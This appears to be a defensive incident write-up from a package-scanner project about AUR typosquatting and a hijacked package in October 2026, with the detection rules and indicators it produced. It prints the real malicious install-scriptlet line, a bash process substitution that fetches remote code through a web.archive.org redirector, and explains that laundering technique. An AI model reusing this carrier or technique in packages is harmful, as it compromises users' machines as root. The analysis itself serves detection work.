<!-- description: The 2026-10-14 AUR name-clone waves: fifteen yay clones, fifteen brave-beta-bin clones, one of them a hijacked package, and what the watcher reported. -->
# 2026-10-14: AUR name-clone waves

On 2026-10-14 the watcher raised two clusters of newly-published AUR packages:

- fifteen created names built around `yay`, and
- fourteen created names around `brave-beta-bin` - a fifteenth package flagged in
  the same cluster, `firefox-git-bin`, was not a clone but a hijacked legitimate
  package (see below).

The created names were published under a maintainer account impersonating an
established one, each a near-miss spelling of a popular helper or browser
package - the kind of name a hurried `yay -S` completes from muscle memory.

## The delivery

The upstream recipe in each package was left byte-intact. The payload rode in a
committed `<pkg>.install` file that the recipe's `install=` line named, so the
malicious bytes sat in the one file a reader is least likely to open:

```bash
bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/...' 2>/dev/null)
```

The fetch is laundered through `web.archive.org`: a host the analysis trusts is
used as a redirector for a fresh origin, so the visible domain and the domain
that serves the script are not the same. The `<pkg>.install` bytes were
byte-identical across the clones in both waves.

## One hijack among the clones

`firefox-git-bin` did not follow the clone pattern. It was a long-standing,
legitimate package - its `PKGBUILD` is the real Mozilla-nightly recipe, with
Mozilla's release signing key and a clean history - and the recipe was left
untouched. The attacker took maintainership alongside the clones and appended
the same payload to its *existing* `firefox-git-bin.install`; the carrier is
byte-identical to the clones' (199 bytes, `sha256` `4b46e737…b75d`). It joined
the cluster through the adoption window, not through a spelling miss, which is
what the correlation layer is for. Because it is a real package that will be
cleaned up and restored, its name is deliberately *not* published as a `package`
indicator; the carrier `hash` covers it instead (see `data/iocs/README.md`).

## What fired, live

What the watcher actually put on the feed that day was the *correlation* layer,
not the payload: `G003` (one maintainer key adopting the batch), `H045` (mass
adoption) and `H052` (unrelated packages sharing a source repository or an
adoption window) named the cluster. The committed `.install` was real - but no
install-scriptlet rule fired on it in the live cycle, and the crossfire rule did
not exist yet. What raised the alarm was that fifteen names appeared at once
under one account, which is the whole point of the correlation layer: it does
not need to read the payload to see a wave.

Reproduced against the committed bytes today, the picture is broader. The
install-scriptlet rules claim the carrier - `H075` (an install hook that fetches
and runs foreign code), with the process-substitution shape `H090` and `C032` -
and the crossfire rule
[X034](../rules/crossfire.md#x034) names the archival indirection
itself, so the *technique* is reported even where a payload rule caught the
bytes. **X034 was written after this incident**, from the pattern these two waves
left: the copy-pasted payload is exactly the case crossfire exists for, and the
fixtures under `tests/fixtures/malicious/campaign/` are those committed bytes,
scoring 100 under the current ruleset. The rule is a lesson the incident taught,
not a rule that caught it.

The same package-`hash` and a pinned archival URL are published as indicators in
`data/iocs/aur-typosquat-2026-10.json`, and a representative diff of each wave
is committed under `tests/fixtures/malicious/campaign/`. The indicators match
outside the score, as attribution, never as a number.

## What a flag here did and did not mean

- It meant a human should look at those packages before building them.
- It did **not** mean the packages were safe to ignore once the names were
  removed, nor that any specific machine was protected: the tool reports, the
  operator decides.
- It did **not** bound the campaign. Clustering is a heuristic over spelling and
  publishing metadata; a later wave that changed its letter substitutions, its
  timing, or its impersonated identity would read as new names again. The
  indicators and the rules raise the cost of the technique; they do not retire
  it.

The honest summary is the one the report itself gives: these packages were
flagged for review.

## TrustSight evolution

The live cycle raised the alarm from the *correlation* layer, not the payload;
every payload rule below arrived in the days after. This is what the incident
changed.

- **[C032](../rules/install-and-persist.md#c032) reads the top-level
  scriptlet.** `H017` and `C016` scope to function bodies and the scope map
  omits top-level lines, so nothing read an install scriptlet outside a hook -
  yet pacman sources an `.install` on every operation and a bare top-level line
  runs as root on each install. The campaign's payload is exactly that line,
  `bash <(curl -L URL)`. C032 parses the committed scriptlet, stands down on an
  unparseable partial read, and matches command-position execution outside every
  function; where one line carries both shapes, `H090` claims the finding.
- **[H090](../rules/fetch-and-execution.md#h090) reads the
  process-substitution carrier.** Its committed-carrier pattern was pipe-keyed,
  so the `bash <(curl ...)` shape both waves shipped scored zero in the manifest
  scan: every watch cycle after the introduction, and any state scan without a
  diff, saw nothing. Two arms now reuse `H075`'s group-free process-substitution
  patterns, so the carrier the rule already existed to catch is read.
- **[X034](../rules/crossfire.md#x034) names the archival transit.**
  The fetch was laundered through `web.archive.org` as a redirector to a fresh
  origin, so the trusted host and the serving host differ. X034 fires on that
  indirection itself and stands down on a plain `curl`/`wget` to a shell, so the
  technique is reported even where a payload rule caught the bytes. It was
  written from these two waves.
- **The correlation layer was tightened, not loosened.** `campaign_cluster` kept
  every G-series finding, one-member clusters included, so a bulk dependency-hub
  sweep read as hundreds of incidents. It now keeps only G-series clusters of two
  or more members: a wave is still one account adopting many names at once, which
  is what raised the alarm here, without reading a sweep as a campaign.
- **The committed bytes are the regression corpus.** The fixtures under
  `tests/fixtures/malicious/campaign/` are the real AUR cgit bytes, `PKGBUILD`
  and `.install` verified byte-for-byte, scoring 100 under the current ruleset.
  The must-not-fire surface (benign hooks, top-level assignments, execution
  inside hook bodies, `curl|bash` in `build()`) is pinned in
  `tests/regressions/test_install_scriptlet_rules.py`.
- **The indicators ship as their own set.** `data/iocs/aur-typosquat-2026-10.json`
  carries the 29 created names, the 199-byte carrier `hash` and the pinned
  archival pattern, on the dedicated `ioc-*` release channel, so a time-sensitive
  set can be republished without a baseline cut. `firefox-git-bin` stays out of
  the package indicators: it is a hijacked legitimate package carrying the same
  carrier, covered by the `hash`, and naming it would indict a recipe that will
  be restored.

The day-of alarm was correlation; the durable result is that the carrier itself
is now read. The rules raise the cost of the technique; they do not retire it.
